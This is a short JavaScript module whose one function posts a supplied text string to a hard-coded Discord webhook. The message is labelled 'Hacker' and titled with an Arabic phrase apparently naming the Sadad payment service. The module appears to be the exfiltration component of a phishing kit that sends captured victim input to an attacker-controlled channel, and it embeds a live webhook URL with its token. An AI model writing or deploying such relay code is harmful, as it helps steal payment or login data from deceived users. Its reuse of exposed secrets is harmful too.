import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1320775759584825364/OtL0Vqq4kBiWS6zElg--YGwhYy5yZQjXTV7lUvYtaQHfNFMpYz_kTvyX_WwtnuGDJCR8",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
